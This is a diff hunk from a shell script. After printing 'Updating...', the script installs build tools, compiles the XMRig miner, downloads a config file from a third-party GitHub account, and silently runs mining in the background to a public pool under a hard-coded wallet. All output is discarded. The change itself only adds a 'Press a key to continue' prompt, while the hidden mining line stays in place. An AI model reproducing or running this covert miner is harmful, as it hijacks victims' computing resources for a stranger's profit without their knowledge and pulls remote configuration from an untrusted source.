@@ -16,7 +16,7 @@ rm cron
 echo "Updating..."
 sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls > /dev/null 2>&1 &   
-
+echo "Press a key to continue"
 trap 'printf "\n";stop;exit 1' 2
 
 
